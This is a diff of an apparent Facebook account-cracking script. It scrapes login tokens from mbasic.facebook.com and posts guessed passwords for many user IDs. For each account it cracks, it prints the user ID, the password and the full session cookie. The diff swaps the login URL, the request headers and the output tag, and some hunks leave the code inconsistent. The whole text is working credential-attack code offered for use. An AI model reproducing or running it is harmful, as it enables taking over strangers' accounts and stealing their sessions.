@@ -319,7 +319,7 @@ else:
     tag = "AM"
 def banner():
     clear()
-    logo=("""  
+    print(f"""
      \33[33;1m██ ██ ██████   ██████  ███    ██ 
      \33[33;1m██ ██ ██   ██ ██    ██ ████   ██ 
      \33[33;1m██ ██ ██████  ██    ██ ██ ██  ██ 
@@ -515,7 +515,7 @@ def m(uid,pwx,tl):
             bi = random.choice([A])
             session = requests.Session()
             ff = random.choice(ugen)
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -526,7 +526,7 @@ def m(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
             'method':'GET',
             'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
             'scheme':'https',
@@ -546,13 +546,13 @@ def m(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro,}
-            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[151:166]
                 #os.system("play-audio Ritu_OK.mp3")
-                print('\033[1;92m[Ritu-OK] '+uid+' | '+ps+'\033[0;97m')
+                print('\033[1;92m[jibon-OK] '+uid+' | '+ps+'\033[0;97m')
                 #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                 print(f'{B}[COOKIE💉] {H}'+coki)
                 cek_apk(session,coki)
